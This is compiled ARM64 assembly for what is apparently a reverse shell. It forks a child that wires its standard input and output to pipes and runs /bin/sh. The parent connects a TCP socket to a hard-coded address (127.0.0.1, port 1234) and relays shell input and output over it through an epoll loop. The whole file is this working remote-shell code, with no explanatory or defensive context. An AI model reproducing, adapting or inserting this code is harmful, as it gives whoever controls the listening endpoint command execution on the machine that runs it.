	.arch armv8-a
	.file	"nix_epoll.c"
	.section	.text.startup,"ax",@progbits
	.align	2
	.global	main
	.type	main, %function
main:
	sub	sp, sp, #8192
	sub	sp, sp, #80
	stp	x29, x30, [sp, -64]!
	add	x29, sp, 0
	add	x0, x29, 64
	stp	x19, x20, [sp, 16]
	stp	x21, x22, [sp, 32]
	str	x23, [sp, 48]
	bl	pipe
	add	x0, x29, 72
	bl	pipe
	bl	fork
	cbnz	w0, .L2
	ldr	w0, [x29, 64]
	mov	w1, 0
	bl	dup2
	ldr	w0, [x29, 76]
	mov	w1, 1
	bl	dup2
	ldr	w0, [x29, 76]
	mov	w1, 2
	bl	dup2
	ldr	w0, [x29, 64]
	bl	close
	ldr	w0, [x29, 68]
	bl	close
	ldr	w0, [x29, 72]
	bl	close
	ldr	w0, [x29, 76]
	bl	close
	adrp	x0, .LC0
	add	x1, x29, 96
	add	x0, x0, :lo12:.LC0
	mov	x2, 0
	stp	x0, xzr, [x29, 96]
	bl	execve
	b	.L3
.L2:
	mov	w23, w0
	ldr	w0, [x29, 64]
	bl	close
	ldr	w0, [x29, 76]
	bl	close
	mov	w2, 0
	mov	w1, 1
	mov	w0, 2
	bl	socket
	mov	w19, w0
	mov	w1, 2
	mov	w2, 16
	strh	w1, [x29, 80]
	mov	w1, -11772
	strh	w1, [x29, 82]
	mov	x1, 127
	movk	x1, 0x100, lsl 16
	str	x1, [x29, 84]
	add	x1, x29, 80
	bl	connect
	mov	w0, 0
	bl	epoll_create1
	cmp	w0, 0
	mov	w20, w0
	ble	.L4
	mov	w21, 1
	add	x3, x29, 112
	mov	w2, w19
	mov	w1, w21
	ldr	w22, [x29, 72]
	str	w21, [x29, 112]
	str	w19, [x29, 120]
	bl	epoll_ctl
	add	x3, x29, 112
	mov	w2, w22
	mov	w1, w21
	mov	w0, w20
	str	w21, [x29, 112]
	str	w22, [x29, 120]
	bl	epoll_ctl
.L8:
	add	x1, x29, 128
	mov	w0, w20
	mov	w3, -1
	mov	w2, 1
	bl	epoll_wait
	cmp	w0, 0
	ble	.L5
	ldr	w0, [x29, 128]
	tst	w0, 24
	bne	.L5
	tbz	x0, 0, .L5
	ldr	w0, [x29, 136]
	mov	x2, 8192
	add	x1, x29, 144
	cmp	w19, w0
	bne	.L6
	mov	w0, w19
	bl	read
	sxtw	x2, w0
	add	x1, x29, 144
	ldr	w0, [x29, 68]
	b	.L13
.L6:
	ldr	w0, [x29, 72]
	bl	read
	sxtw	x2, w0
	add	x1, x29, 144
	mov	w0, w19
.L13:
	bl	write
	b	.L8
.L5:
	mov	w2, w19
	mov	w0, w20
	mov	x3, 0
	mov	w1, 2
	bl	epoll_ctl
	mov	w2, w22
	mov	w0, w20
	mov	x3, 0
	mov	w1, 2
	bl	epoll_ctl
	mov	w0, w20
	bl	close
.L4:
	mov	w0, w23
	mov	w1, 17
	bl	kill
	mov	w0, w19
	bl	close
.L3:
	ldr	w0, [x29, 68]
	bl	close
	ldr	w0, [x29, 72]
	bl	close
	ldr	x23, [sp, 48]
	ldp	x19, x20, [sp, 16]
	mov	w0, 0
	ldp	x21, x22, [sp, 32]
	ldp	x29, x30, [sp], 64
	add	sp, sp, 8192
	add	sp, sp, 80
	ret
	.size	main, .-main
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"/bin/sh"
	.ident	"GCC: (Ubuntu/Linaro 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
